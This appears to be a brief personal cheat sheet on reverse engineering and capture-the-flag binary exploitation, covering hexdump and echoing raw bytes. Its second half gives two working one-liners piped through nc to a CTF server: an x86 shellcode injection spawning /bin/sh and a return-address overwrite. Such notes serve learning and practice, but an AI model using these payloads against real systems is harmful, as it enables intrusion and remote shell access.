# reverse engineering

#### hexdump

###### display file in raw format
By default, without "-C", hexdump displays data as 16-bit words on little endian systems.
```
hexdump -C <filename>
```
###### Echo binary data on the terminal
Useful for injecting shellcode
```
echo -n -e '\xff\xff\xff\xab'
```

#### Binary exploitation
Injecting shell code
```
(python -c 'print "A"*12 + "\x90\x90\x90\x90\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x90\x90\x90\x90'; cat) | nc ctf.pwn.press 1337
```
Buffer overflow
```
(python -c 'print "A"*12 + "\xcd\x84\x04\x08"'; cat) | nc ctf.pwn.press 1337
```
